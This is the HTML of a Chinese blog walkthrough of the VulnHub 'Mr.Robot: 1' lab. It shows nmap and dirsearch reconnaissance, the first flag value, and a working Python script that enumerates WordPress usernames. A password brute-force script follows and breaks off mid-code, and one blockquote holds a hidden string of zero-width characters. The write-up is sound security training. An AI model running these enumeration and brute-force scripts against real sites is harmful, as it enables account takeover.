@@ -1,0 +1,796 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Mr.Robot: 1 Walkthrough | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="VulnHub Mr.Robot: 1 靶机渗透完整复现：dirsearch 目录爆破发现 WordPress、fsocity.dic 字典爆破后台账号、主题编辑器写 webshell 拿 shell、破解 password.raw-md5 切换 robot 用户、Nmap SUID 提权拿到 key3，附 MSF overlayfs 内核提权失败复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mr.Robot: 1 Walkthrough">
+<meta property="og:url" content="https://jasmine-iris.top/2026/09/11/Mr.Robot_1_Walkthrough/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="VulnHub Mr.Robot: 1 靶机渗透完整复现：dirsearch 目录爆破发现 WordPress、fsocity.dic 字典爆破后台账号、主题编辑器写 webshell 拿 shell、破解 password.raw-md5 切换 robot 用户、Nmap SUID 提权拿到 key3，附 MSF overlayfs 内核提权失败复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp">
+<meta property="article:published_time" content="2026-09-11T02:30:00.000Z">
+<meta property="article:modified_time" content="2026-09-11T09:57:50.187Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="MSF">
+<meta property="article:tag" content="内核漏洞">
+<meta property="article:tag" content="靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Mr.Robot: 1 Walkthrough",
+  "url": "https://jasmine-iris.top/2026/09/11/Mr.Robot_1_Walkthrough/",
+  "image": "https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp",
+  "datePublished": "2026-09-11T02:30:00.000Z",
+  "dateModified": "2026-09-11T09:57:50.187Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "https://jasmine-iris.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://img.jasmine-iris.top/img/photo.png"><link rel="canonical" href="https://jasmine-iris.top/2026/09/11/Mr.Robot_1_Walkthrough/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Mr.Robot: 1 Walkthrough',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/font/lxgwwenkaigbscreen/result.min.css"><link rel="preload" as="style" href="/font/lxgwwenkaigbscreen/result.min.css"><link rel="stylesheet" href="/css/light-bg13.css?v=17"><link rel="stylesheet" href="/css/top-img.css"><link rel="preload" as="image" href="https://img.jasmine-iris.top/img/leaf-arrow-forest-36.png"><link rel="preload" as="image" href="https://img.jasmine-iris.top/img/leaf-arrow-forest-hand-36.png"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><link rel="stylesheet" href="/css/theme-bg.css?v=1"><link rel="stylesheet" href="/css/context-menu.css?v=1"><link rel="stylesheet" href="/css/post-extras.css?v=1"><link rel="stylesheet" href="/css/link-style.css?v=1"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Jasmine_Iris" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://img.jasmine-iris.top/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://img.jasmine-iris.top/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar" loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">21</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/quiz/"><i class="fa-fw fas fa-graduation-cap"></i><span> SecLearn 刷题</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/feedback/?p=blog"><i class="fa-fw fas fa-comment-dots"></i><span> 意见箱</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">Mr.Robot: 1 Walkthrough</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> 项目</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/quiz/"><i class="fa-fw fas fa-graduation-cap"></i><span> SecLearn 刷题</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/feedback/?p=blog"><i class="fa-fw fas fa-comment-dots"></i><span> 意见箱</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Mr.Robot: 1 Walkthrough</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-09-11T02:30:00.000Z" title="发表于 2026-09-11 10:30:00">2026-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-11T09:57:50.187Z" title="更新于 2026-09-11 17:57:50">2026-09-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">靶机练习</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/vulnhub/">vulnhub</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image:url(https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/cover.webp);"></div><article class="container post-content" id="article-container"><h1 id="一、靶机信息"><a href="#一、靶机信息" class="headerlink" title="一、靶机信息"></a>一、靶机信息</h1><ul>
+<li><strong>名称</strong>：Mr.Robot: 1</li>
+<li><strong>地址</strong>：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a></li>
+<li><strong>网络</strong>：两台机器均为 NAT</li>
+</ul>
+<blockquote>
+<p>靶机导入后先拍快照再开机，玩崩了一键还原；kali 最好也拍快照‌‌‌‌‌‌‌‌‌​​‌​‌​‌‍‌‌‌‌‌‌‌‌‌​​‌‌‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌​​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​‌‌​‌​‍‌‌‌‌‌‌‌‌‌‌​‌​​‌​‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​‌‍‌‌‌‌‌‌‌‌‌​​‌​‌‌​‍‌‌‌‌‌‌‌‌‌​​​‌‌​​‍‌‌‌‌‌‌‌‌‌‌​‌​​​‌‍‌‌‌‌‌‌‌‌‌​​​‌​‌‌‍‌‌‌‌‌‌‌‌‌​​‌​​​​‍‌‌‌‌‌‌‌‌‌​​​‌‌‌‌‍</p>
+<p>由于用 VMware 跑 Mr.Robot 靶机，老 Ubuntu14.04 内核和新版 VMware 硬件不兼容，一直卡在 Starting up 起不来；换成 VirtualBox，成功启动到登录界面。 </p>
+<p>同时我在 VirtualBox 里装了一个 kali。</p>
+</blockquote>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120408284_5snmg2.webp" loading='lazy'></p>
+<hr>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="2-0-确定-kali-的-IP"><a href="#2-0-确定-kali-的-IP" class="headerlink" title="2.0 确定 kali 的 IP"></a>2.0 确定 kali 的 IP</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120410324_ycbfp3.webp" loading='lazy'></p>
+<p>kali 的 IP 是 10.0.2.15</p>
+<hr>
+<h2 id="2-1-找靶机-IP"><a href="#2-1-找靶机-IP" class="headerlink" title="2.1 找靶机 IP"></a>2.1 找靶机 IP</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 10.0.2.0/24</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120412211_murgac.webp" loading='lazy'></p>
+<p>靶机 IP：10.0.2.3</p>
+<hr>
+<h2 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -T4 -p- 10.0.2.3</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120414301_71ut66.webp" loading='lazy'></p>
+<p>只有 80 和 443 –&gt; Web 应用</p>
+<p>证书 commonName 是 <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.example.com/">www.example.com</a> </p>
+<hr>
+<h2 id="2-3-访问-http-10-0-2-3"><a href="#2-3-访问-http-10-0-2-3" class="headerlink" title="2.3 访问 http://10.0.2.3"></a>2.3 访问 <code>http://10.0.2.3</code></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120415919_8bvw9w.webp" loading='lazy'></p>
+<hr>
+<h2 id="2-4-目录爆破"><a href="#2-4-目录爆破" class="headerlink" title="2.4 目录爆破"></a>2.4 目录爆破</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.3 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html</span><br></pre></td></tr></tbody></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dir</code></td>
+<td>目录爆破模式</td>
+<td>对目标进行目录 / 文件枚举扫描</td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>目标 URL</td>
+<td>指定要扫描的目标地址</td>
+</tr>
+<tr>
+<td><code>-w</code></td>
+<td>字典文件路径</td>
+<td>指定爆破用的字典文件</td>
+</tr>
+<tr>
+<td><code>-x</code></td>
+<td>额外尝试后缀</td>
+<td><code>-x php,txt,html</code><br> → 额外尝试 <code>.php</code><br> / <code>.txt</code><br> / <code>.html</code><br> 后缀</td>
+</tr>
+<tr>
+<td><code>-t</code></td>
+<td>并发线程</td>
+<td><code>-t 50</code><br> → 用 50 个并发线程，扫描更快</td>
+</tr>
+</tbody></table>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120417396_jy69a1.webp" loading='lazy'></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120419026_dsrebf.webp" loading='lazy'></p>
+<p>含有 WordPress 特征文件</p>
+<p>/robots.txt</p>
+<p>/phpmyadmin</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120420755_6do18u.webp" loading='lazy'></p>
+<p>/readme</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120422744_343hp8.webp" loading='lazy'></p>
+<p>/license</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120424348_kktfcu.webp" loading='lazy'></p>
+<p>/intro</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120426073_g7a5fj.webp" loading='lazy'></p>
+<p>/wp-links-opml</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120427728_y5flwp.webp" loading='lazy'></p>
+<hr>
+<h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><h2 id="3-1-访问-robots-txt"><a href="#3-1-访问-robots-txt" class="headerlink" title="3.1 访问 /robots.txt"></a>3.1 访问 <code>/robots.txt</code></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120429876_7ynvoe.webp" loading='lazy'></p>
+<p><code>fsocity.dic</code>大概率是密码字典或用户名字典</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120431091_823hg9.webp" loading='lazy'></p>
+<p>fsocity.dic 原始文件内容太多，去重：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l fsocity.dic          <span class="comment"># 先看原始行数</span></span><br><span class="line"><span class="built_in">sort</span> -u fsocity.dic &gt; fsocity_clean.dic</span><br><span class="line"><span class="built_in">wc</span> -l fsocity_clean.dic    <span class="comment"># 再看去重后行数</span></span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120432397_tdtkdw.webp" loading='lazy'></p>
+<p><code>key-1-of-3.txt</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120433807_7kz3al.webp" loading='lazy'></p>
+<p>key1：073403c8a58a1f80d943455fb30724b9</p>
+<hr>
+<h2 id="3-2-登录-WordPress"><a href="#3-2-登录-WordPress" class="headerlink" title="3.2 登录 WordPress"></a>3.2 登录 WordPress</h2><p>访问<code>http://10.0.2.3/wp-login</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120435191_i7q2et.webp" loading='lazy'></p>
+<p>有一个登录页面，发现的报错差异批量测。把候选用户名循环喂给登录页，看谁的报错不是 Invalid username。</p>
+<hr>
+<h3 id="3-2-1-爆破用户名"><a href="#3-2-1-爆破用户名" class="headerlink" title="3.2.1 爆破用户名"></a>3.2.1 爆破用户名</h3><p>让 AI 写了一个爆破用户名的 python 脚本：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"没有 requests 库，先安装: pip install requests"</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://10.0.2.3/wp-login.php"</span></span><br><span class="line">DICT = <span class="string">r"C:\Users\Jasmine\Desktop\fsocity_clean.dic"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(DICT, encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"ignore"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    users = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"共 <span class="subst">{<span class="built_in">len</span>(users)}</span> 个候选用户名"</span>)</span><br><span class="line"></span><br><span class="line">found = []</span><br><span class="line"><span class="keyword">for</span> i, user <span class="keyword">in</span> <span class="built_in">enumerate</span>(users, <span class="number">1</span>):</span><br><span class="line">    data = {</span><br><span class="line">        <span class="string">"log"</span>: user,</span><br><span class="line">        <span class="string">"pwd"</span>: <span class="string">"wrongpass123"</span>,</span><br><span class="line">        <span class="string">"wp-submit"</span>: <span class="string">"Log In"</span>,</span><br><span class="line">        <span class="string">"redirect_to"</span>: <span class="string">"http://10.0.2.3/wp-admin/"</span>,</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(URL, data=data, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] 请求失败: <span class="subst">{user}</span> (<span class="subst">{e.__class__.__name__}</span>)"</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Invalid username"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"\n[+] 用户名存在: <span class="subst">{user}</span>"</span>)</span><br><span class="line">        m = re.search(<span class="string">r'id="login_error"[^&gt;]*&gt;(.*?)&lt;/div&gt;'</span>, r.text, re.S)</span><br><span class="line">        <span class="keyword">if</span> m:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"    报错: "</span> + re.sub(<span class="string">r"&lt;[^&gt;]+&gt;"</span>, <span class="string">""</span>, m.group(<span class="number">1</span>)).strip())</span><br><span class="line">        found.append(user)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">500</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"...已测试 <span class="subst">{i}</span>/<span class="subst">{<span class="built_in">len</span>(users)}</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"\n结果: 有效用户名 -&gt; <span class="subst">{found}</span>"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n结果: 字典里没有命中任何用户名"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://img.jasmine-iris.top/posts/Mr.Robot_1_Walkthrough/1789120436714_lird86.webp" loading='lazy'></p>
+<hr>
+<h3 id="3-2-2-爆破密码"><a href="#3-2-2-爆破密码" class="headerlink" title="3.2.2 爆破密码"></a>3.2.2 爆破密码</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"没有 requests 库，先安装: pip install requests"</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://10.0.2.3/wp-login.php"</span></span><br><span class="line">DICT = <span class="string">r"C:\Users\Jasmine\Desktop\fsocity_clean.dic"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(DICT, encoding=<span class="string">"utf-8"</span>, errors=<span class="string">"ignore"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pwds = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f"共 <span class="subst">{<span class="built_in">len</span>(pwds)}</span> 个候选密码"</span>)</span><br><span class="line"></span><br><span class="line">found = []</span><br><span class="line"><span class="keyword">for</span> i, pw <span class="keyword">in</span> <span 